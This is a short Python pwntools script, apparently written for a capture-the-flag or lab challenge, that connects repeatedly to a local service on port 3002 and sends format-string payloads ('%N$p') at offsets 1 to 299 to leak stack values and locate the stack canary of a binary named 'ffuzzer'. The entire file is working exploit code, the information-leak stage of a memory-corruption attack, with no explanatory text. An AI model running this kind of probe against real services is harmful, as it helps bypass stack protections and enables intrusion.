from pwn import *
import time

elf = context.binary = ELF('./ffuzzer')
context.log_level = "error"
rop = ROP(elf)

#p = process()
p = remote('0.0.0.0', 3002)
#input()

for i in range(1, 300):
    p = remote('0.0.0.0', 3002)
    time.sleep(0.2)
    p.clean()
    p.sendline(f"%{i}$p")
    try:
        canary = int(p.recvline().strip()[2:], 16)
        print(f'{hex(canary)} {i}')
    except:
        print(f'error {i}')
    p.close()
